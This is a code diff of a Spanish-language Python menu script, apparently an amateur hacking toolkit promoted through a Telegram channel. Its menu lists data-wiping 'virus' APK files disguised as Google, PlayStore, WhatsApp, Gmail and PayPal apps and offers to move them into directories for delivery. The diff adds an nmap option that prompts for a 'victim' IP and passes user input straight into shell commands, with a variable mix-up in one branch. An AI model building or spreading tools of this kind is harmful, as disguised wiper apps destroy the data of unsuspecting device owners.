@@ -138,8 +138,7 @@ while True:
         print(Fore.RED+ "       -_~-,       ` `   ./" + Fore.BLUE+ "https://t.me/HackingAndPrograming")
         print(Fore.RED+ "           {_            )")
         print("             ^^\..___,.--")
-
-#--------------15 archivoz-----------------
+        #--------------15 archivoz-----------------
 
         print(Fore.BLUE+ "\n!ATENCION ESTOS VIRUZ ELIMINAN TODA LA INFORMACION DE LOS DISPOSITIVOZ!" , "\n--------los archivoz fueron tomados de otro script (papaviruz)-------")
         print(Fore.RED+ "\n[1]" + Fore.YELLOW+ "Google.apk" , Fore.RED+ "\n[2]" + Fore.YELLOW+ "PlayStore.apk" , Fore.RED+ "\n[3]"+ Fore.YELLOW+ "Termux.apk" , Fore.RED+ "\n[4]" , Fore.YELLOW+ "Galeria.apk" , Fore.RED+ "\n[5]" , Fore.YELLOW+ "Gmail.apk" , Fore.RED+ "\n[6]" , Fore.YELLOW+ "Whatsapp Espia.apk" , Fore.RED+ "\n[7]" , Fore.YELLOW+ "Camara.apk" , Fore.RED+ "\n[8]" + Fore.YELLOW+ "Internet gratis.apk" , Fore.RED+ "\n[9]" , Fore.YELLOW+ "Whatsapp lite.apk" , Fore.RED+ "\n[10]" + Fore.YELLOW+ "PayPal.apk")
@@ -258,21 +257,6 @@ while True:
             print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
             time.sleep(3)
 
-#-----All archivez------------------
-
-        elif eleccionarch == "all" or "All" or "ALL":
-            system("clear")
-            
-            banner()
-            
-            ALL=input(Fore.YELLOW+ "deseas mover todos los viruz a un solo directorio??" + Fore.GREEN+ " Y" + Fore.WHITE+ "/" +Fore.RED+ "N \n")
-            if ALL == "N":
-                print("reiniciando bucle...")
-                time.sleep(1)
-            elif ALL == "Y":
-                print("Moviendo archivoz esto puede tardar un poco...")
-                time.sleep(1)
-
 #---------Invalid Options----------
         
         else:
@@ -298,7 +282,7 @@ while True:
     elif eleccion == "4":
         system("clear")
          
-        print(Fore.GREEN+"███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█")
+        print(Fore.BLUE+"███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█")
         print("████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█")
         print("███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█")
         print("████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█")
@@ -322,9 +306,47 @@ while True:
         print("███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████")
         print("██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████")
         print("███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████")
-        
-        print(Fore.BLUE+ "SEGUIMOS ACCTUALIZANDO EL SCRIPT, PRONTO SE AGREGARA AL 100% NMAP")
-        time.sleep(4)
+        nmap=input(Fore.WHITE+ "ya tienes instalado nmap" + Fore.GREEN+ " Y"+Fore.WHITE+"/"+Fore.RED+"N"+ Fore.GREEN+"\n~"+ Fore.WHITE+ "$ ")
+        if nmap == "y":
+            print(Fore.WHITE+ "Deseas analizar una IPv4 o una IPv6")
+            print(Fore.RED+"[1]"+ Fore.WHITE+"IPv4"+ Fore.RED+"\n[2]"+ Fore.WHITE+"IPv6")
+            Nmap=input(Fore.GREEN+"~"+ Fore.WHITE+"$ ")
+            if Nmap == "1":
+                print("Checando Nmap...")
+                time.sleep(2)
+                Nmap2=input("Ingresa la direccion IPv4 de la victima: ")
+                system("nmap -Pn " + Nmap)
+                time.sleep(3)
+                break
+            
+            elif Nmap == "2":
+                print("Checando Nmap...")
+                Nmap3=input("Ingresa la direccion IPv6 de la victima: ")
+                system("nmap -6 "+ Nmap3)
+                time.sleep(3)
+                break
+                
+        elif nmap == "n":
+            print("Instalando Nmap...")
+            print("Sistema Operativo"+"\n[1] Termux \n[2] Otra distribucion de Linux")
+            SO=input(Fore.GREEN+"~"+Fore.WHITE+"$ ")
+            if SO == "1":
+                print("Istalando Nmap...")
+                system("pkg install nmap")
+                time.sleep(5)
+            elif SO == "2":
+                print("Instalando Nmap...")
+                system("sudo apt install nmap")
+                time.sleep(5)
+            else:
+                print(Fore.RED+"Elije una opcion valida")
+                time.sleep(2)
+        else:
+            print(Fore.RED+"Elije una opcion valida")
+            time.sleep(2)
+            
+    
+#--------Exit-------------
     
     elif eleccion == "3":
         exit=input(Fore.GREEN+ "~" +Fore.WHITE+ "$ Deseas salir del  programa? y/n" + Fore.GREEN+ "\n~"+ Fore.WHITE+ "$ ")
@@ -336,6 +358,7 @@ while True:
         elif exit == "n":
             print(Fore.GREEN+ "Reiniciando bucle...")
             time.sleep(2)
+    
     
     else:
         system("clear")
